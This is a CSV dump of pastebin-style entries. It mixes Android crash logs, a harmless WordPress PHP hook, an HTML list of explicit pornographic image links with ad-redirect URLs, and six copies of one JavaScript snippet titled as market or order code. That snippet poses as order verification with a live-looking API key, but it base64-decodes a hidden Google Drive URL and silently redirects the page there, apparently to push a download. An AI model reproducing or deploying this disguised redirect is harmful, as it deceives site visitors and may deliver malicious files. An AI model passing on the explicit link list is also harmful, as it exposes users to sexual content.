id,title,username,language,date,content
XY7zhTiW,Market.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 12:55:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37240/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Cdztt6DP,Untitled,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 12:40:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69898/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Csu7f6D0,Products.js,dentira,JavaScript,Wednesday 9th of April 2025 12:24:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75018/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iZxxzURy,2025-04-09T08:23:40.066722,powerampache,PHP,Wednesday 9th of April 2025 12:23:41 AM CDT,"1.01-79 (79) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:737)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:707)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:224)
	at android.os.Looper.loop(Looper.java:318)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1100)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":13},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mMap"":{}},""timestampMs"":561090353,""cause"":{""sniffFailures"":[{},{}],""uri"":{},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1100,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":737,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":707,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":102,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":224,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":318,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}]}"
Xt2VkdmR,Voxel extract regular product prices,gabetu,PHP,Wednesday 9th of April 2025 12:20:06 AM CDT,"function extract_and_save_product_amounts( $event ) {
    $post = $event->post;

    // Ensure the post type is 'products'
    if ( $post->post_type->get_key() !== 'products' ) {
        return;
    }

    $post_id = $post->get_id(); // Use get_id() for Voxel compatibility

    // Get the 'product' custom field.
    $product_data = maybe_unserialize( get_post_meta( $post_id, 'product', true ) );

    // Debugging: Log the retrieved product data.
    error_log( ""Extract Function triggered for post ID: $post_id"" );
    error_log( ""Raw product data: "" . print_r( $product_data, true ) );

    // Check if the custom field exists and is not empty.
    if ( ! empty( $product_data ) ) {
        // Decode the JSON data.
        $product_array = json_decode( $product_data, true );

        // Validate structure and extract amounts.
        if ( is_array( $product_array ) && isset( $product_array['base_price']['amount'] ) ) {
            // Convert and round amount
            $amount = number_format(floatval($product_array['base_price']['amount']), 2, '.', '');

            // Update product_amount meta
            delete_post_meta( $post_id, 'product_amount' );
            update_post_meta( $post_id, 'product_amount', $amount );
            error_log( ""Updated product_amount to: $amount"" );

            // Handle product_discount_amount
            if ( isset($product_array['base_price']['discount_amount']) && $product_array['base_price']['discount_amount'] !== '' ) {
                $discount_amount = number_format(floatval($product_array['base_price']['discount_amount']), 2, '.', '');
                delete_post_meta( $post_id, 'product_discount_amount' );
                update_post_meta( $post_id, 'product_discount_amount', $discount_amount );
                error_log( ""Updated product_discount_amount to: $discount_amount"" );
            } else {
                // Delete the meta field if discount_amount is missing or empty
                delete_post_meta( $post_id, 'product_discount_amount' );
                error_log( ""Deleted product_discount_amount for post ID: $post_id"" );
            }

        } else {
            error_log( ""Invalid JSON structure or missing 'amount' for post ID: $post_id"" );
        }
    } else {
        error_log( ""No product data found for post ID: $post_id"" );
    }
}

// Hook into Voxel events
add_action( 'voxel/app-events/post-types/products/post:submitted', 'extract_and_save_product_amounts' );
add_action( 'voxel/app-events/post-types/products/post:updated', 'extract_and_save_product_amounts' );
"
FYQxGZWv,Mens only (Apr 9 2025),MarcSpencer,HTML,Wednesday 9th of April 2025 12:11:03 AM CDT,"Ivan takes Tony
<a href=""https://fappic.com/hgibp1yn04m2/corbin-fisher-ivan-takes-tony-001.jpg""><img src=""https://img103.fappic.com/i/03914/hgibp1yn04m2_t.jpg""></a><a href=""https://fappic.com/699midt6fcxy/corbin-fisher-ivan-takes-tony-002.jpg""><img src=""https://img103.fappic.com/i/03914/699midt6fcxy_t.jpg""></a><a href=""https://fappic.com/fg0hwakuwdlr/corbin-fisher-ivan-takes-tony-003.jpg""><img src=""https://img103.fappic.com/i/03914/fg0hwakuwdlr_t.jpg""></a><a href=""https://fappic.com/upwgp8smgtkt/corbin-fisher-ivan-takes-tony-004.jpg""><img src=""https://img103.fappic.com/i/03914/upwgp8smgtkt_t.jpg""></a><a href=""https://fappic.com/mcln95ipso2b/corbin-fisher-ivan-takes-tony-005.jpg""><img src=""https://img103.fappic.com/i/03914/mcln95ipso2b_t.jpg""></a><a href=""https://fappic.com/fatnz8j78ltm/corbin-fisher-ivan-takes-tony-006.jpg""><img src=""https://img103.fappic.com/i/03914/fatnz8j78ltm_t.jpg""></a><a href=""https://fappic.com/o8v7n51ggrrv/corbin-fisher-ivan-takes-tony-007.jpg""><img src=""https://img103.fappic.com/i/03914/o8v7n51ggrrv_t.jpg""></a><a href=""https://fappic.com/p13pmj5viocy/corbin-fisher-ivan-takes-tony-008.jpg""><img src=""https://img103.fappic.com/i/03914/p13pmj5viocy_t.jpg""></a><a href=""https://fappic.com/4qjft0etxpzx/corbin-fisher-ivan-takes-tony-009.jpg""><img src=""https://img103.fappic.com/i/03914/4qjft0etxpzx_t.jpg""></a><a href=""https://fappic.com/tcvtsyt1wmbo/corbin-fisher-ivan-takes-tony-010.jpg""><img src=""https://img103.fappic.com/i/03914/tcvtsyt1wmbo_t.jpg""></a><a href=""https://fappic.com/pj2vnzd2y7q0/corbin-fisher-ivan-takes-tony-011.jpg""><img src=""https://img103.fappic.com/i/03914/pj2vnzd2y7q0_t.jpg""></a><a href=""https://fappic.com/dopkg1b7va1y/corbin-fisher-ivan-takes-tony-012.jpg""><img src=""https://img103.fappic.com/i/03914/dopkg1b7va1y_t.jpg""></a><a href=""https://fappic.com/65a3egpq28kl/corbin-fisher-ivan-takes-tony-013.jpg""><img src=""https://img103.fappic.com/i/03914/65a3egpq28kl_t.jpg""></a><a href=""https://fappic.com/ncubga4pqzec/corbin-fisher-ivan-takes-tony-014.jpg""><img src=""https://img103.fappic.com/i/03914/ncubga4pqzec_t.jpg""></a><a href=""https://fappic.com/6rvf67vvr6l3/corbin-fisher-ivan-takes-tony-015.jpg""><img src=""https://img103.fappic.com/i/03914/6rvf67vvr6l3_t.jpg""></a>

Jeffrey Lloyd dominates Max Romano
<a href=""https://fappic.com/m4pbk453ye2t/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-001.jpg""><img src=""https://img103.fappic.com/i/03914/m4pbk453ye2t_t.jpg""></a><a href=""https://fappic.com/5zzn4mxen5k4/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-002.jpg""><img src=""https://img103.fappic.com/i/03914/5zzn4mxen5k4_t.jpg""></a><a href=""https://fappic.com/j0nd8ym62xus/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-003.jpg""><img src=""https://img103.fappic.com/i/03914/j0nd8ym62xus_t.jpg""></a><a href=""https://fappic.com/nxez4d6ko0lf/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-004.jpg""><img src=""https://img103.fappic.com/i/03914/nxez4d6ko0lf_t.jpg""></a><a href=""https://fappic.com/cqrj9j53lojr/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-005.jpg""><img src=""https://img103.fappic.com/i/03914/cqrj9j53lojr_t.jpg""></a><a href=""https://fappic.com/8iwdq4mgjmt1/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-006.jpg""><img src=""https://img103.fappic.com/i/03914/8iwdq4mgjmt1_t.jpg""></a><a href=""https://fappic.com/aov9xyhcy1re/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-007.jpg""><img src=""https://img103.fappic.com/i/03914/aov9xyhcy1re_t.jpg""></a><a href=""https://fappic.com/hwohuh377ot7/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-008.jpg""><img src=""https://img103.fappic.com/i/03914/hwohuh377ot7_t.jpg""></a><a href=""https://fappic.com/ujy48k5s5gef/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-009.jpg""><img src=""https://img103.fappic.com/i/03914/ujy48k5s5gef_t.jpg""></a><a href=""https://fappic.com/ftowtbsarotc/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-010.jpg""><img src=""https://img103.fappic.com/i/03914/ftowtbsarotc_t.jpg""></a><a href=""https://fappic.com/t80iftjzrpub/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-011.jpg""><img src=""https://img103.fappic.com/i/03914/t80iftjzrpub_t.jpg""></a><a href=""https://fappic.com/3iegyedywaoo/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-012.jpg""><img src=""https://img103.fappic.com/i/03914/3iegyedywaoo_t.jpg""></a><a href=""https://fappic.com/gztrh977v0qj/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-013.jpg""><img src=""https://img103.fappic.com/i/03914/gztrh977v0qj_t.jpg""></a><a href=""https://fappic.com/cn6fih7ffdkn/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-014.jpg""><img src=""https://img103.fappic.com/i/03914/cn6fih7ffdkn_t.jpg""></a><a href=""https://fappic.com/bks15mvtnhm0/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-015.jpg""><img src=""https://img103.fappic.com/i/03914/bks15mvtnhm0_t.jpg""></a><a href=""https://fappic.com/ydc4zd24k6ei/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-016.jpg""><img src=""https://img103.fappic.com/i/03914/ydc4zd24k6ei_t.jpg""></a><a href=""https://fappic.com/tr5zsjm0m2aw/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-017.jpg""><img src=""https://img103.fappic.com/i/03914/tr5zsjm0m2aw_t.jpg""></a><a href=""https://fappic.com/i54b90xod7k4/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-018.jpg""><img src=""https://img103.fappic.com/i/03914/i54b90xod7k4_t.jpg""></a><a href=""https://fappic.com/gpwd3jkrlumr/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-019.jpg""><img src=""https://img103.fappic.com/i/03914/gpwd3jkrlumr_t.jpg""></a><a href=""https://fappic.com/yz6tq69t51j4/lucas-entertainment-jeffrey-lloyd-dominates-max-romano-020.jpg""><img src=""https://img103.fappic.com/i/03914/yz6tq69t51j4_t.jpg""></a>

Tom Bentley and Jax Thirio 
<a href=""https://fappic.com/1d4yxyhb8pia/787060.jpg""><img src=""https://img103.fappic.com/i/03914/1d4yxyhb8pia_t.jpg""></a><a href=""https://fappic.com/ic8fv0heynqg/787061.jpg""><img src=""https://img103.fappic.com/i/03914/ic8fv0heynqg_t.jpg""></a><a href=""https://fappic.com/4vdmfos0n13s/787062.jpg""><img src=""https://img103.fappic.com/i/03914/4vdmfos0n13s_t.jpg""></a><a href=""https://fappic.com/rphgltk7qxg1/787063.jpg""><img src=""https://img103.fappic.com/i/03914/rphgltk7qxg1_t.jpg""></a><a href=""https://fappic.com/hj2olhcmc4yg/787064.jpg""><img src=""https://img103.fappic.com/i/03914/hj2olhcmc4yg_t.jpg""></a><a href=""https://fappic.com/vwd12rlbpx0e/787065.jpg""><img src=""https://img103.fappic.com/i/03914/vwd12rlbpx0e_t.jpg""></a><a href=""https://fappic.com/xs6zmw39b2jo/787066.jpg""><img src=""https://img103.fappic.com/i/03914/xs6zmw39b2jo_t.jpg""></a><a href=""https://fappic.com/7ltkmekkov87/787067.jpg""><img src=""https://img103.fappic.com/i/03914/7ltkmekkov87_t.jpg""></a><a href=""https://fappic.com/whgbpv6686we/787068.jpg""><img src=""https://img103.fappic.com/i/03914/whgbpv6686we_t.jpg""></a><a href=""https://fappic.com/x2cigg3mkxlb/787069.jpg""><img src=""https://img103.fappic.com/i/03914/x2cigg3mkxlb_t.jpg""></a><a href=""https://fappic.com/y8g5dw635bcb/787070.jpg""><img src=""https://img103.fappic.com/i/03914/y8g5dw635bcb_t.jpg""></a><a href=""https://fappic.com/6hlb30kewx3g/787071.jpg""><img src=""https://img103.fappic.com/i/03914/6hlb30kewx3g_t.jpg""></a><a href=""https://fappic.com/c4y78fkzjegb/787072.jpg""><img src=""https://img103.fappic.com/i/03914/c4y78fkzjegb_t.jpg""></a><a href=""https://fappic.com/3obhgtxjh7ht/787073.jpg""><img src=""https://img103.fappic.com/i/03914/3obhgtxjh7ht_t.jpg""></a><a href=""https://fappic.com/705swr4bys6z/787074.jpg""><img src=""https://img103.fappic.com/i/03914/705swr4bys6z_t.jpg""></a>

Bruce Garcia and Johnny Moon 
<a href=""https://u-x7sqeba7tt.urlcash.net""><img src=""https://img103.fappic.com/i/03914/ignggw6vr71f_t.jpg""></a><a href=""https://u-i7sqebbi6f.urlcash.net""><img src=""https://img103.fappic.com/i/03914/5iudgh13sp7z_t.jpg""></a><a href=""https://u-67sqebctvy.urlcash.net""><img src=""https://img103.fappic.com/i/03914/9bdfyx70x74k_t.jpg""></a><a href=""https://u-g7sqebdwtr.urlcash.net""><img src=""https://img103.fappic.com/i/03914/ruccdl715aeo_t.jpg""></a><a href=""https://u-77sqebeztc.urlcash.net""><img src=""https://img103.fappic.com/i/03914/s1kjj3l4tbr7_t.jpg""></a><a href=""https://u-g7sqebfi12.urlcash.net""><img src=""https://img103.fappic.com/i/03914/oonsfm2z67lt_t.jpg""></a><a href=""https://u-r7sqebgss1.urlcash.net""><img src=""https://img103.fappic.com/i/03914/z4udvvlfnq21_t.jpg""></a><a href=""https://u-27sqebh4ex.urlcash.net""><img src=""https://img103.fappic.com/i/03914/rm2zflrva9m3_t.jpg""></a><a href=""https://u-o7sqebiax4.urlcash.net""><img src=""https://img103.fappic.com/i/03914/ldfu21brjah0_t.jpg""></a><a href=""https://u-g7sqeb04iv.urlcash.net""><img src=""https://img103.fappic.com/i/03914/1jmpw3l5e41i_t.jpg""></a><a href=""https://u-p7sqeb1hja.urlcash.net""><img src=""https://img103.fappic.com/i/03914/zx3u914xbbrn_t.jpg""></a><a href=""https://u-g7sqeb2lg5.urlcash.net""><img src=""https://img103.fappic.com/i/03914/0kzqijf2bx1p_t.jpg""></a><a href=""https://u-b7sqeb31m1.urlcash.net""><img src=""https://img103.fappic.com/i/03914/zfr35f9ke0tt_t.jpg""></a><a href=""https://u-v7sqeb4ve7.urlcash.net""><img src=""https://img103.fappic.com/i/03914/yx69v8frr63e_t.jpg""></a><a href=""https://u-c7sqeb5bsy.urlcash.net""><img src=""https://img103.fappic.com/i/03914/dqbqmtk9s3b8_t.jpg""></a><a href=""https://u-47sqeb6flx.urlcash.net""><img src=""https://img103.fappic.com/i/03914/h8w31uylq9lh_t.jpg""></a><a href=""https://u-x7sqeb7ohk.urlcash.net""><img src=""https://img103.fappic.com/i/03914/fwcsva0oi112_t.jpg""></a>
"
deCMkrFF,Order.js,dentira,JavaScript,Wednesday 9th of April 2025 12:09:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94414/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BpL6udS5,2025-04-09T13:53:05.582399,powerampache,PHP,Tuesday 8th of April 2025 11:53:06 PM CDT,"1.01-79 (79) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
fzpNPegM,Market.js,dentira,JavaScript,Tuesday 8th of April 2025 11:53:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16772/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cCFmmxs7,Untitled,dentira,JavaScript,Tuesday 8th of April 2025 11:37:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54167/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
